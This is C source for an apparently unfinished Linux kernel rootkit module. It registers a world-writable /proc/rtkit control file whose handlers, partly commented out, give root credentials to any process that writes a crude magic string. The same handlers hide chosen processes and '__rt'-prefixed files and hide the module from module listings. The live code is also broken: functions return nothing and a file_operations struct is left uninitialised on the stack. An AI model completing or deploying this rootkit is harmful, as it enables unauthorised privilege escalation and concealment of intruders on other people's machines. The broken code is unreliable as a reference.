#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <linux/fs.h>

/*
*
********************
* DEFINITIONS
********************
*
*/

#define MIN(a, b) \
    ({ typeof (a) _a = (a); \
      typeof (b) _b = (b); \
     _a < _b ? _a : _b; })

#define MAX_PIDS 50

/*
********************
* STATIC VARIABLES SECTION
********************
* we don't want to have it visible in kallsyms and have access to it all the time
* Kallsyms --> extracts all the non-stack symbols from a kernel and builds a 
* data blob that can be linked into that kernel for use by debuggers.
* A static global variable or a function is "seen" only in the file it's declared in
*/

struct proc_dir_entry
{
    unsigned int low_ino;
    umode_t mode;
    nlink_t nlink;
    kuid_t uid;
    kgid_t gid;
    loff_t size;
    const struct inode_operations *proc_iops;
    const struct file_operations *proc_fops;
    struct proc_dir_entry *parent;
    struct rb_root_cached subdir;
    struct rb_node subdir_node;
    void *data;
    atomic_t count;  /* use count */
    atomic_t in_use; /* number of callers into module in progress; */
                     /* negative -> it's going away RSN */
    struct completion *pde_unload_completion;
    struct list_head pde_openers; /* who did ->open, but not ->release */
    spinlock_t pde_unload_lock;   /* proc_fops checks and pde_users bumps */
    u8 namelen;
    char name[];
} __randomize_layout;

static struct proc_dir_entry *proc_root;
static struct proc_dir_entry *proc_rtkit;

static int (*proc_readdir_orig)(struct file *, void *, filldir_t);
static int (*fs_readdir_orig)(struct file *, void *, filldir_t);

static filldir_t proc_filldir_orig;
static filldir_t fs_filldir_orig;

static struct file_operations *proc_fops;
static struct file_operations *fs_fops;

static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

static char pids_to_hide[MAX_PIDS][8];
static int current_pid = 0;

static char hide_files = 1;

static char module_hidden = 0;

static char module_status[1024];

/*
*
********************
* OTHER FUNCTIONS
********************
*
*/

/*
/proc is very special in that it is also a virtual filesystem. 
It's sometimes referred to as a process information pseudo-file system. 
It doesn't contain 'real' files but runtime system information (e.g. system memory, devices mounted, hardware configuration, etc). 
For this reason it can be regarded as a control and information centre for the kernel. 
In fact, quite a lot of system utilities are simply calls to files in this directory. 
For example, 'lsmod' is the same as 'cat /proc/modules' while 'lspci' is a synonym for 'cat /proc/pci'. 
By altering files located in this directory you can even read/change kernel parameters (sysctl) while the system is running.
*/

ssize_t rtkit_read(struct file *file, char __user *buffer, size_t count, loff_t *data)
{
    /*int size;
	
	sprintf(module_status, 
"RTKIT\n\
DESC:\n\
  hides files prefixed with __rt or 10-__rt and gives root\n\
CMNDS:\n\
  mypenislong - uid and gid 0 for writing process\n\
  hpXXXX - hides proc with id XXXX\n\
  up - unhides last process\n\
  thf - toogles file hiding\n\
  mh - module hide\n\
  ms - module show\n\
STATUS\n\
  fshide: %d\n\
  pids_hidden: %d\n\
  module_hidden: %d\n", hide_files, current_pid, module_hidden);

	size = strlen(module_status);

	if (off >= size) return 0;
  
	if (count >= size-off) {
		memcpy(buffer, module_status+off, size-off);
	} else {
		memcpy(buffer, module_status+off, count);
	}
  
	return size-off;*/
}

ssize_t rtkit_write(struct file *file, const char __user *buff, size_t count, loff_t *data)
{
    /*if (!strncmp(buff, "mypenislong", MIN(11, count))) { //changes to root
		struct cred *credentials = prepare_creds();
		credentials->uid = credentials->euid = 0;
		credentials->gid = credentials->egid = 0;
		commit_creds(credentials);
	} else if (!strncmp(buff, "hp", MIN(2, count))) {//upXXXXXX hides process with given id
		if (current_pid < MAX_PIDS) strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
	} else if (!strncmp(buff, "up", MIN(2, count))) {//unhides last hidden process
		if (current_pid > 0) current_pid--;
	} else if (!strncmp(buff, "thf", MIN(3, count))) {//toggles hide files in fs
		hide_files = !hide_files;
	} else if (!strncmp(buff, "mh", MIN(2, count))) {//module hide
		module_hide();
	} else if (!strncmp(buff, "ms", MIN(2, count))) {//module hide
		module_show();
	}
	
        return count;*/
}



static int __init procfs_init(void)
{
    struct file_operations new_proc_fops;
    proc_rtkit = proc_create("rtkit", 0666, NULL, &new_proc_fops);
    if (proc_rtkit == NULL)
        return 0;
    proc_root = proc_rtkit->parent;
    //printk(KERN_ALERT "the copied string is: %s \n",proc_root->name); //debug
    if (proc_root == NULL || strcmp(proc_root->name, "/proc") != 0)
    {
        return 0;
    }
new_proc_fops.read=&rtkit_read;
new_proc_fops.write=&rtkit_write;
    /*//substitute proc readdir to our wersion (using page mode change)
	proc_fops = ((struct file_operations *) proc_root->proc_fops);
	proc_readdir_orig = proc_fops->readdir;
	set_addr_rw(proc_fops);
	proc_fops->readdir = proc_readdir_new;
	set_addr_ro(proc_fops);
	*/
    return 1;
}

/*
*
********************
* MODULE INIT/EXIT
********************
*
*/

static int __init rootkit_init(void)
{
    procfs_init();
}

static void __exit rootkit_exit(void)
{
}

module_init(rootkit_init);
module_exit(rootkit_exit);